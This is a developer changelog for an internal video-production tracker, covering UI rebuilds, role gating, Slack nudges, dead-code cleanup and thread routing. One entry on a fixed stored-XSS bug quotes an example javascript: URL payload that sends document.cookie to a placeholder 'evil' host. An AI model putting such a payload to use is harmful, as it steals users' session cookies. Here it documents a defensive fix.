`calendarMonth` / `scrollY` all survive the reload.

- **Content Lead Home — full rebuild + role gating (2026-09-15)**: CL Home (the contentLead landing tab, added in Batch E) was noisy and had a couple of interaction bugs Elsa hit while viewing it as Millie. Rebuilt end-to-end. **Filter narrowed** from "everything except Approved/Cancelled" to `contentLeadQc ∈ {For Review, Needs Revisions}` on the viewer's own campaigns only — Draft, empty, and Approved rows are gone, and the team-wide backlog section that used to appear below Yours is removed entirely (it was noise for a CL viewing her own dashboard). **Card compacted** to two lines: name · category on top, campaign name · editor beneath; QC pill, MINE badge, Brief link, and Open-in-Campaigns link all dropped as redundant with the section header + purple left border. **Final video promoted** from a muted inline link into a filled accent pill (`▶ Final video`) sitting next to Approve / Revisions on the right; when `a.finalVideo` is empty a muted dashed `no final link yet` chip fills the same slot so row rhythm stays constant. **"Rework" → "Revisions"** — button label, tooltip, prompt copy, comment prefix, and success toast all renamed; handler stays `App.clReviewRework` so no call sites broke. **Stat strip moved below the queue and swapped** — dropped "My campaigns" (redundant with the queue itself), kept "Approved today" (now green when > 0), added new "Sent for revisions today" (amber when > 0). Each tile has an obvious `▸ Show N` / `▾ Hide` chip pinned to the right of its label; expanding renders a per-video breakdown of `<Campaign name> · <Category>` (capped at 5, `+ N more` when longer). The whole tile is clickable when there are items; when the count is 0 no chip renders and the tile isn't interactive. **Yours section is collapsible** with the same chip pattern, defaulting expanded. All three collapse states (`clHomeYoursOpen` default true, `clHomeApprovedOpen` default false, `clHomeRevisionsOpen` default false) persist per-browser in **localStorage** rather than the Firestore-synced STATE — one user's toggle can't stomp another's since they'd share the snapshot doc. Handler is a single generic `App.toggleClHomeSection(key, defaultOpen)` that reads localStorage, flips, and re-renders. **New `clQcDateRevisions` field** on the asset (stamped inside `setAssetContentLeadQc`, never cleared) feeds the revisions tile. **Role gating tightened**: `ROLE_TAB_VISIBILITY.editor` now excludes `clHome` in addition to `config` (was previously visible to editors via `ALL_TABS_INTERNAL.filter(t !== 'config')`), so editors, cat heads, and visitors all lose the tab. Defense-in-depth added at the render dispatch so a hand-set `STATE.tab='clHome'` from the console for a non-authorized role falls back to Config instead of rendering the view. **Bug fix carried over from the earlier rebuild attempt**: the `mine.length===0` force-override on the previous team-queue caret was the reason clicking the caret silently did nothing — the new design has no team queue and no force-override, so all three chips actually respond to clicks. Same audit turned up three sibling tabs missing the `.content` scroll wrapper (My Day, Training editor branch, Training admin branch) — every returned HTML string was `<div style="padding:24px;...">` with no overflow, so those tabs were clipped at viewport height inside `.main { overflow: hidden }`. All three now open with `<div class="content">…</div>`, restoring scroll. Also caught: `renderCatReviewCard` was emitting a 💬 Comments toggle button on cards in the "sent back for revisions" block that did nothing — `opts.forceCommentsOpen` OR-short-circuited `commentsOpen` at render time, so clicks flipped STATE with no visible effect. Fix: when forced open, render a static label instead of the toggle button.

- **Daily Clip-Tagging Task — per-editor Slack nudge from Notifications (2026-09-14)**: Elsa asked for a way to send editors their daily clip-tagging task without hand-writing the message every morning. New card on the Notifications tab (below Category Head Approved, above Daily Tally) with one row per editor in `TAG_EDS = ['Zidni', 'Sharm', 'Patty']`. Each row shows the editor's avatar, thread status dot, `X tagged · Y left of goal` line, and a compact progress bar. **Count is auto-derived** from `STATE.broll` — a clip counts toward an editor's daily total when `emailToEditor(clip.taggedBy) === editor` AND `taggedAt.toDate()` normalises to today UK. Live-updates as they tag (subscribed via `Fb.subscribeBroll` for admin/editor roles). The 🚀 button posts a Slack message into that editor's daily thread via the existing `sendSlackChatPostMessage` Cloud Function — the same path per-editor QC notifications and Daily Tally already use, so no new backend. **No webhook fallback**: if today's thread isn't set for that editor the button is disabled with an explanatory tooltip, since a webhook post would broadcast the nudge to the main channel instead of the private-ish per-editor thread. Message template: mention (via `mentionEditor`) + goal + tagged-so-far + remaining + a one-line pointer to the Clips tab. When an editor hits the goal the message flips to a `🎉 X/Y — done for the day!` acknowledgment. A shared per-editor daily goal (default 200 clips, editable inline in the card via `App.setBrollDailyGoal`, persisted to Firestore via `STATE.brollDailyGoal` + `buildSnapshot` allowlist so every teammate sees the same target). New App methods: `sendClipTaggingTask(editor)`, `copyClipTaggingTask(editor)` (📋 button; useful when the thread isn't set), and `setBrollDailyGoal()`. Helper functions live next to `buildDailyTallyForEditor` in the SLACK HELPERS block: `getBrollDailyGoal()`, `brollTaggedByEditorToday(editor)`, `buildClipTaggingMessageForEditor(editor)`.

- **2026-09-13 roadmap — five-batch build across Tiers 1-4**: Planned in [`~/.claude/plans/no-ideally-each-editor-wondrous-knuth.md`](/Users/elsak/.claude/plans/no-ideally-each-editor-wondrous-knuth.md) and shipped in five deploys. Summary of every change, batch-by-batch, so any single item can be traced back to its commit.

  **Batch A** (`c625299`) — cleanup + Meta removal + IG posted dot.
  - Deleted `tracker.html` (orphan iframe wrapper pointing at an old GH-Pages URL, zero references from index/app/styles), `QUICK_START.md`, `GOOGLE_SHEETS_IMPORT_GUIDE.md`, `sample-google-sheet-export.csv` (onboarding trio superseded by this PRD; the guide + sample were only cited by QUICK_START), plus untracked `kinetic_dots_bg/` (5 MP4s, no code references).
  - Fixed orphan section comment header at the old Version-history slot ("Version history panel (Google-Sheets-style)" over an unrelated Daily-tally block).
  - Fully deleted the Meta paid ads connector (per Elsa's "for now = fully delete" decision on the plan): Automations "Meta Ads — Gone Live Sync" card, `App.saveMetaSettings` and `App.syncMetaLiveDates` (~215 lines including `fetchMetaAds`/`fetchMetaActivities` callable wiring), `STATE.metaAccessToken` and `STATE.metaAdAccountIds`, and every `Fb.subscribe` merge/migration branch that touched those fields (snapshot include, local snapshot, skip-branch, per-slot merge, single→array migration). Dropped the META NOTE comment in `functions/index.js`. Meta functions were never actually deployed anyway.
  - Added a small **green posted-dot** to the video-name cell whenever `a.igLink` is truthy. New `.posted-dot` class in `styles.css`. Caveat inline: presence of `igLink` isn't a perfect "posted" signal — someone could paste a draft/scheduled link — upgrade to a dedicated `postedAt` field if false positives crop up.

  **Batch B** (`8bd11ae`) — Strategy tab + share-link fix + Organic column swap.
  - **Strategy tab** (§5): clone of the Editing Style pattern. `renderStrategyView()` mirrors `renderEditingStyleView` with `STATE.strategyNotionUrl` and `App.setStrategyUrl`. Same `isSafeEmbedUrl` guard, same sandbox, same "Open in new tab" fallback. Registered in `TAB_DEFS`, `DEFAULT_TAB_ORDER`, `ALL_TABS`, `VIEWER_TABS`, and every `ROLE_TAB_VISIBILITY` row.
  - **Campaign share link fix**: `App.copyCampaignLink` now prefers `navigator.clipboard.writeText` and falls back to `window.prompt()` (URL always retrievable even when both clipboard paths refuse — private mode, permission denied). URL logged to console. Success toast names the campaign. Deep-link resolution in `Fb.subscribe` retries up to 5× at 200ms — the first snapshot callback can fire before `STATE.campaigns` is populated. `decodeURIComponent` on both `campaignId` and `assetId` for consistency with the `encodeURIComponent` in `copyCampaignLink`.
  - **Organic column swap** (§4.2, §5.1): new asset fields `contentLeadQc` (reuses `CATEGORY_HEAD_QC_VALUES` set) + `clQcDateApproved` (ISO date). Added to `mkAsset` and `EDITABLE_FIELDS`. `App.setAssetContentLeadQc` mirrors `setAssetCategoryHeadQc` — 'Approved' auto-stamps `clQcDateApproved`, other verdicts clear it. Row/thead in `renderCampaignsView` gate on `isOrganic = (camp.type||DEFAULT_CAMPAIGN_TYPE)==='Organic'`. When true: Est. Delivery column → Date Assigned (read-only `assignedAt`); CH QC + CH Date Approved columns → CL QC + CL QC Date Approved; toolbar Est. Delivery date filter is hidden; `getFilteredAssets` skips the `estDeliveryFilter` entirely for Organic. CL QC **replaces** CH QC on Organic (Elsa's call — no coexist).

  **Batch C** (`aa12e8e`) — CL Review + Editor Home + Linear widget + bi-weekly KPI DM.
  - **Content Lead Review tab** (§5, new, badge): `contentLeadReviewAssets` returns Organic videos with `contentLeadQc` unset or in Draft/For Review/Needs Revisions. `contentLeadReviewCount` powers the badge — only "For Review" counts (that's the active queue). `renderContentLeadReviewView` is one card per video with a three-line summary (name/category, campaign + editor, QC pill + Final/Brief/Tracker links) and two buttons (Approve, Rework). `App.clReviewApprove` sets `contentLeadQc='Approved'`; `App.clReviewRework` prompts for a note, appends to `a.comments` as `"CL Rework: ..."`, then sets `contentLeadQc='Needs Revisions'`. Modelled on Cat Heads Review but with simpler UI per the plan.
  - **Editor Home / "My Day" tab** (§5, new): combined assigned-videos + EOD surface — the roadmap's redefinition of "EOD" (per-editor daily surface, not the existing auto Daily Tally). New asset fields on `mkAsset`: `doneToday` (ISO date the editor tags when they wrap for the day) + `decisions` (append-only array of `{note, at, by}` for creative-choice notes). `renderEditorHomeView` filters `STATE.assets` by `editor === currentEditor` (via existing `currentEditorFromAuth` from the `EDITOR_EMAILS` map) and `status != Approved/Cancelled`. Sort: not-done-today first, then newest assigned. Per-video: "Done today" checkbox (dims + strikethrough when ticked), live count in header, decision-note input (Enter or Log button appends). Shows last 3 decisions inline. `App.toggleAssetDoneToday`, `App.addAssetDecision` handlers. Prepended to editor role visibility and `DEFAULT_TAB_ORDER` so new editors land here first (existing users keep their saved tab order).
  - **Linear tasks widget** (§7): `getLinearTasks` Cloud Function (uses the pre-existing `LINEAR_API_KEY` secret slot at `functions/index.js:29`) queries Linear GraphQL for the caller's `assignedIssues` where `state.type not in ['completed','canceled']`. Returns id/identifier/title/url/state/dueDate/priority. Empty response when the caller's email isn't in Linear (as a friendly warning, not an error). `App.fetchLinearTasks` + `renderLinearTasksPanel` — session-only cache in `STATE._linearTasks` (not persisted). Manual Refresh button. Rendered on the Editor Home; embedded on the Content Lead Home when it lands in Batch E.
  - **Bi-weekly KPI Slack DM** (§7): new scheduled Cloud Function `biWeeklyKpiScheduled` (cron `'0 9 * * 1'`, Europe/London) reads `state/app` grades directly, computes each editor's 14-day trio (First-Pass Rate, Time to Ship, Video Edits) via `computeScorecardServer` (server-side port of `computeScorecard` — the client version isn't callable from a Cloud Function). DMs each editor via `conversations.open` + `chat.postMessage`. Fortnightly cadence enforced by an ISO-week-number even/odd check inside the handler (firebase-functions scheduler doesn't natively support fortnightly). `runBiWeeklyKpiNow` callable exposed for manual testing from an admin browser console.

  **Batch E** (`4941104`) — Training library + Content Lead Home + admin visibility fix.
  - **Training library** (§5, new): new `STATE.trainingModules` (array of `{id, title, brief, notionUrl, loomUrl, footageUrl, createdAt, createdBy}`) + `STATE.trainingCompletions` (object keyed by editor email, holding `{[moduleId]: {startedAt, completedAt}}`). Both persisted in the `state/app` snapshot doc (small collection — no separate subcollection needed to start). Editor view: Start / Mark Complete / Undo per module, status badge (Not started / In progress / ✓ Completed with date), inline links to Brief / Loom / Footage URLs when set. Admin/CL view: completion matrix (editors × modules) with ✓/…/— cells. Config panel "Training modules" — admin-only CRUD via `roleAtLeast('admin')` gate. Handlers: `trainingStart`, `trainingComplete`, `trainingUncomplete`, `trainingAddModule`, `trainingDeleteModule`. No auto-assignment logic — pure pull surface (per Elsa's answer on the plan: editors self-pick when idle, "brief to edit" with optional recorded work-together session attached).
  - **Content Lead Home tab** (§5, new, default landing for contentLead role): `renderContentLeadHomeView` assembles four widgets from existing helpers with no new data model. **My campaigns** — `STATE.campaigns` filtered by `camp.contentLead === my first name` (matches the picker's storage shape at `app.js:9475`). **QC queue** — Organic assets on my campaigns with `contentLeadQc` unset or in Draft/For Review/Needs Revisions (narrower than the CL Review tab's all-Organic view so the dashboard shows "waiting on YOU" specifically). **Approved today** — count of assets on my campaigns with `dateApproved === today` OR `clQcDateApproved === today`. **Linear tasks** — reuses `renderLinearTasksPanel` from Batch C. Two-column layout on desktop, wraps on mobile. Prepended to `DEFAULT_TAB_ORDER` (before `editorHome`) so new contentLead sign-ins land here.
  - **Admin visibility fix**: added `editorHome` to admin role visibility. The Batch C commit gated it to editor-only, which meant admins couldn't test the tab — the render function's fallback already handles admins-who-aren't-editors, so this is a pure visibility fix.

  **Follow-up ops (still open for Elsa):**
  - Batch C's Cloud Functions deploy blocked by a **pre-existing** missing secret: `ANTHROPIC_API_KEY` on `generateCaptionsForAsset` (not one this roadmap added). Set via `firebase functions:secrets:set ANTHROPIC_API_KEY` then rerun `firebase deploy --only functions`, or deploy individual functions to skip that one.
  - Once functions deploy: new callables `getLinearTasks` and `runBiWeeklyKpiNow` need the `allUsers` Cloud Run invoker binding per [[slack-callable-invoker-fix]] — otherwise client calls fail with "internal".
  - `LINEAR_API_KEY` secret slot is declared but may be unset — set the value before the Linear widget will return real data.
  - Firestore security rules may need updating for `trainingModules`/`trainingCompletions` (they currently live inside `state/app` which is already writable by signed-in users, so probably works out of the box).

  **Deferred (kept for now — revisit after burn-in):** `STATE.contentLeadDailyThreads` tombstone (line refs shifted since Batch A), `_assetsMigrated` legacy migration, `PL` migration one-shot cleanup. All three carry old-doc compat weight — call out for removal after 30 days of no snapshots referencing them.

- **Dead-code sweep — Scheduler tab, HTML5 drag handlers, legacy grading form (2026-09-12)**: Three separately-commited deletions of code that had zero live callers, cross-checked against git activity (nothing touched since June 2026) and grep (no inline `onclick`/`ondrag*`/form-id references anywhere). (1) **Scheduler remnants** — the tab was removed months ago but the top-level `clearSchedule()` and `releaseScheduled()` helpers, six `App.*` methods (`setSchedulerDate`, `toggleWeekends`, `clearSchedule`, `releaseScheduled`, `scheduleAssignEditor`, `scheduleSetEta`), the `STATE.schedulerDate` / `schedulerIncludeWeekends` fields, the `schedulerIncludeWeekends` line in `Fb.buildSnapshot`, and the `schedulerDate` entry in `PER_USER_UI_FIELDS` were all still present. All removed; §5.4 and §4.2 rows updated. Kept: asset `.scheduledFor` and `.released` fields (still read by `buildDailyQueueMessage` and the display-date fallback at `app.js:49`; historical assets in Firestore may still carry `released:true` and must stay excluded from the daily-queue export). ~66 lines. (2) **HTML5 drag handlers** — `App.onTabDrag*`, `App.onTodayDrag*`, `App.onTodayCardDrag*` (11 methods) and their `TabDragState` / `TodayDragState` globals were left behind when tabs and Today-kanban switched to the pointer-drag module (`pdragStart` / `pdragCheckClick`); the `renderTopbar` comment already flagged the swap. ~171 lines. (3) **Legacy "Log a video" grading form** — the pre-inline-grading form (`#gr-editor` / `#gr-rounds` / `#gr-asset` / `#gr-brand` / `#gr-video`) had been dropped from the UI but its handlers (`onGradingAssetPick`, `addGrade`, `resetGradeRoundsAuto`, `toggleGradeField`, `setGradeField`, `deleteGrade`, `dismissGrade`, `restoreGrade`, `setGradingPeriod`, `setGradingEditorFilter`) and per-user filter fields (`gradingPeriod`, `gradingEditorFilter`, `gradingCustomEntry`) were still shipping. The comment on `gradingCustomEntry` had already been flagging it as legacy. All removed; inline `toggleAssetGradeField` / `setAssetGradeField` stay (these are the live grading path). ~143 lines. Total: **~380 lines out of `app.js`**, three atomic commits (`0611e3e`, `ba25258`, `6f45b0b`) so any one is trivial to revert.

- **Editing Style tab — stored XSS + fail-open role check + missing tab-migration (2026-09-12)**: The new §5.10 tab (added the same day) went out with three issues caught in the code-review pass. (1) **Stored XSS via iframe src / `<a href>`** — the Notion URL was placed into the iframe `src` and the "Open in new tab" link's `href` via `escapeHtml` only, with no scheme validation. Any authenticated teammate calling `App.setEditingStyleUrl('javascript:fetch("https://evil/e?c="+document.cookie)')` would have written to the Firestore snapshot, and every other teammate's next render would execute the payload in the tracker's origin (the iframe carries `sandbox="allow-scripts allow-same-origin"`, so the sandbox lets the iframe reach parent cookies/DOM). Fixed by adding `isSafeEmbedUrl()` — a regex allowlist of `http:` / `https:` schemes — and enforcing it at both the write side (`setEditingStyleUrl` toasts + rejects, so bad URLs never reach Firestore) and the read side (`renderEditingStyleView` blanks the iframe/link + surfaces a "stored URL was rejected" message for admins if a legacy value already exists). (2) **Fail-open `canEdit`** — `var canEdit = (typeof roleAtLeast === 'function') ? roleAtLeast('pm') : true;` — the fallback granted edit rights to everyone if `roleAtLeast` ever failed to load. Flipped to `false`. (3) **Tab-order migration missing** — `DEFAULT_TAB_ORDER` placed `editingStyle` between `grading` and `editorStats`, but every existing teammate already had a saved `STATE.tabOrder` without it, so `renderTopbar`'s append-unknown-tabs step dropped it at the very end of their nav (after Config). Added a splice migration mirroring the existing `editingCalendar` and `notifications` ones so `editingStyle` lands beside `grading` on next load for everyone.

- **Organic daily-thread routing — collapsed per-lead → one shared UK-only thread (2026-09-10)**: Previously every Organic sub-campaign carried a `contentLead` field (Millie / '') and each lead had their own daily Slack thread (`STATE.contentLeadDailyThreads`), consulted only for Organic QC reports; editor batches and CHQ batches on Organic sub-campaigns still routed through the per-editor / per-category / intl threads. Elsa asked to simplify: one shared Slack thread for **all** Organic work — Millie watches — used for editor batches, CHQ batches, AND QC reports; then narrowed further to **UK Organic only** so intl Organic keeps flowing through the intl thread. Implementation: added `STATE.organicDailyThread` (single slot) + `organicDailyThreadHistory` (last 7). New resolver `resolveDailyThreadForOrganic(items)` returns the thread iff it's set today AND `itemsAllOrganicUK(items)` — every item has `country === 'UK'` and its campaign's `type === 'Organic'`. Wired as the highest-priority branch in `resolveRouteForItems` (before intl/editor/category); reason tag `'organic'` is stamped into the `notified` activity log. `resolveQcThreadForCampaign` was rewritten to require `camp.country === 'UK'` and route to the shared thread regardless of `contentLead`. UI: the two per-lead cards in Automations were replaced by a single "Daily Slack thread (Organic · UK)" card with handlers `App.saveOrganicDailyThread` / `App.clearOrganicDailyThread`; the QC card's Content Lead dropdown was relabeled `Owner:` (ownership tag only, no routing effect). Any today-dated per-lead thread already set is auto-migrated into the shared slot on first load; the legacy `contentLeadDailyThreads` map is kept in the schema for cross-version compat and the midnight sweep archives its stale entries. Verified: `itemsAllOrganicUK([UK Organic])` → thread; `[UK Organic + UK Paid]` → null (falls to paid routing); `[IT Organic]` → null (falls to intl thread); `[UK Paid]` → null (unchanged).
